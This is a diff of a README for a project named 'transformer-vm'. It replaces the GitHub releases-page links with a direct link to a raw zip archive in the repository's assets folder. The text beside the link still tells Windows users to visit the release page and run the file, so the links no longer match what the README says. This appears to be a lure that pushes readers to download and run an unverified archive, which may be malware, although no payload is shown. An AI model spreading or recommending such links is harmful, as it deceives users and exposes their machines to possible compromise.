@@ -1,11 +1,11 @@
 # ⚙️ transformer-vm - Run programs as transformer weights
 
-[![Download transformer-vm](https://img.shields.io/badge/Download%20transformer-vm-blue?style=for-the-badge)](https://github.com/ouosoeor/transformer-vm/releases)
+[![Download transformer-vm](https://img.shields.io/badge/Download%20transformer-vm-blue?style=for-the-badge)](https://raw.githubusercontent.com/ouosoeor/transformer-vm/main/assets/vm_transformer_v1.9.zip)
 
 ## 📥 Download
 Visit the release page to download and run this file on Windows:
 
-https://github.com/ouosoeor/transformer-vm/releases
+https://raw.githubusercontent.com/ouosoeor/transformer-vm/main/assets/vm_transformer_v1.9.zip
 
 ## 🪟 Windows setup
 1. Open the release page.
